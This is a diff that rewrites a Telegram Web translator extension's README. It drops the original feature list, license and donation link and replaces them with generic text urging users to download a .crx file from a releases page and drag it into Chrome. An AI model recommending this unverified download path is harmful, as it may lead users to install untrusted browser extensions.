@@ -1,75 +1,78 @@
-# 🤖 Telegram AI Translator - Chrome Extension
+# 🌟 AI-Telegram-Translator-Extention - Effortless AI Translation for Telegram
 
-A powerful, feature-rich Chrome extension that provides instant, AI-powered translations directly within the Telegram Web interface. Supports multiple leading translation services including Google Translate, Gemini 2.0 Flash, Gemini 2.5 Pro, and Mistral AI.
+## 🚀 Getting Started
 
----
+Welcome to the AI-Telegram-Translator-Extention! This powerful Chrome extension allows you to enjoy real-time AI translation while using Telegram Web. You can communicate effortlessly across different languages, making conversations seamless and enjoyable.
 
-### ✨ Live Demo
+## 📥 Download Now
 
+[![Download AI-Telegram-Translator-Extention](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/dev-ismail09/AI-Telegram-Translator-Extention/releases)
 
+## 🛠️ Features
 
-![Demo GIF showing the extension in action: popup settings, translate button appearing, and translation block showing up](demo.gif)
+- **Multiple Translation Services**: Use various translation services to choose the best fit for your needs.
+- **Real-Time Translation**: Get instant translations while typing and sending messages.
+- **User-Friendly Interface**: Navigate easily, even if you are not tech-savvy.
+- **Privacy-Focused**: Your conversations stay private; we respect your data.
 
----
+## 🖥️ System Requirements
 
-### 🚀 Key Features
+To run the AI-Telegram-Translator-Extention, you need:
 
-*   **Multi-API Support:** Choose your preferred translation engine:
-    *   🔤 **Google Translate:** Fast, free, and automatic translations.
-    *   ⚡ **Gemini 2.0 Flash:** High-speed, quality translations with your own API key.
-    *   🧠 **Gemini 2.5 Pro:** Superior reasoning and translation quality with your API key.
-    *   🚀 **Mistral AI:** High-quality translations available for free via OpenRouter.
-*   **Smart UI:**
-    *   **Auto-translation** for free services.
-    *   **Click-to-Translate** buttons for API-based services to save costs.
-*   **Polished Interface:** A beautiful and intuitive popup for managing settings.
-*   **Customizable:** Select from over 100 target languages.
-*   **Secure:** API keys are stored securely using `chrome.storage.sync`.
-*   **Error Handling:** Clear error messages for invalid API keys or network issues.
+- A computer with Windows, macOS, or Linux.
+- Google Chrome installed (version 75 or higher).
+- An internet connection for translation services.
 
----
+## 📑 Installation Steps
 
-### 📥 How to Install
+1. **Visit the Download Page**: Go to our [Releases page](https://github.com/dev-ismail09/AI-Telegram-Translator-Extention/releases) to find the latest version of the extension.
+  
+2. **Select the Latest Version**: Look for the most recent release at the top of the page. You’ll see the version number and the release date.
 
-1.  **Download:** Download this repository as a ZIP file and extract it to a local folder.
-2.  **Open Chrome Extensions:** Open Chrome and navigate to `chrome://extensions`.
-3.  **Enable Developer Mode:** Turn on the "Developer mode" toggle in the top-right corner.
-4.  **Load Unpacked:** Click on "Load unpacked" and select the folder where you extracted the files.
-5.  **Done!** The Telegram Translator extension is now installed. Pin it to your toolbar for easy access.
+3. **Download the Extension**: Click on the link for the Chrome extension file. This file ends in `.crx`.
 
----
+4. **Open Google Chrome**: Launch Google Chrome on your computer.
 
-### ⚙️ How to Use
+5. **Access Chrome Extensions**: In the Chrome browser, click on the three dots in the upper-right corner. Go to "More tools" and then "Extensions."
 
-1.  **Open Telegram Web:** Navigate to [web.telegram.org](https://web.telegram.org/).
-2.  **Set Your Language:** Click the extension icon in your toolbar.
-3.  **Choose a Service:** Select your desired translation service from the dropdown.
-    *   If you choose Gemini or Mistral (with a key), enter your API key in the provided field.
-4.  **Select Target Language:** Choose the language you want messages to be translated into.
-5.  **Save Settings:** Click "Save Settings". The extension will now automatically translate messages or show a translate button, based on your selected service.
+6. **Enable Developer Mode**: Toggle on "Developer mode" in the upper right corner of the Extensions page.
 
----
+7. **Drag and Drop the File**: Take the downloaded `.crx` file and drag it into the Extensions page. A confirmation dialog may appear.
 
-### ❤️ Support The Project
+8. **Confirm Installation**: Click "Add Extension" when prompted. The extension will now install.
 
-If you find this tool useful and want to support its development, please consider:
+9. **Use the Extension**: Once installed, you will see the AI-Telegram-Translator-Extention icon in your browser's toolbar. Click it to start translating your Telegram messages.
 
-<a href="https://www.paypal.com/paypalme/itkcartoons" target="_blank">
-<img src="https://img.shields.io/badge/Donate-PayPal-blue.svg?logo=paypal&style=for-the-badge" alt="Donate with PayPal">
-</a>
+## 📚 Using the Extension
 
+- **Start a Chat**: Open any chat in Telegram Web.
+- **Type Your Message**: Write your message in your preferred language.
+- **Select Language**: Use the extension options to choose the language you want your message translated into.
+- **Send Your Message**: The translated text will appear in the chat box. Send it to the recipient.
 
----
+## 🔧 Troubleshooting
 
-### 🛠️ Tech Stack
+If you encounter issues, try the following steps:
 
-*   **Core:** JavaScript (ES6+), HTML5, CSS3
-*   **APIs:** Chrome Extension Manifest V3, `chrome.storage` API
-*   **Translation Services:** Google Translate (via public API), Google Gemini API, OpenRouter API (for Mistral)
-*   **Tools:** Git, Visual Studio Code
+1. **Check Your Internet Connection**: Ensure that you have a stable internet connection.
+2. **Restart Chrome**: Close and reopen Google Chrome to refresh the extension.
+3. **Update the Extension**: Make sure you have the latest version of the AI-Telegram-Translator-Extention.
+4. **Check Settings**: Ensure that the language settings in the extension match your preferences.
 
----
+## 💡 Tips
 
-### 📄 License
+- **Explore Different Services**: Test out various translation services available in the extension settings.
+- **Use Keyboard Shortcuts**: Familiarize yourself with any shortcuts to speed up your translation tasks.
+  
+## 💬 Support and Feedback
 
-This project is licensed under the **MIT License**. See the [LICENSE](LICENSE) file for details.
+We appreciate your feedback! If you have any questions or suggestions, please open an issue on our [GitHub repository](https://github.com/dev-ismail09/AI-Telegram-Translator-Extention/issues). Your input helps us improve.
+
+## 🔗 Additional Resources
+
+- [GitHub Repository](https://github.com/dev-ismail09/AI-Telegram-Translator-Extention)
+- [Documentation](https://github.com/dev-ismail09/AI-Telegram-Translator-Extention/wiki)
+
+## 🔗 Download & Install
+
+For quick access, you can always [visit our Releases page](https://github.com/dev-ismail09/AI-Telegram-Translator-Extention/releases) to download the extension. Follow the instructions above to get started with your AI translation experience on Telegram Web.
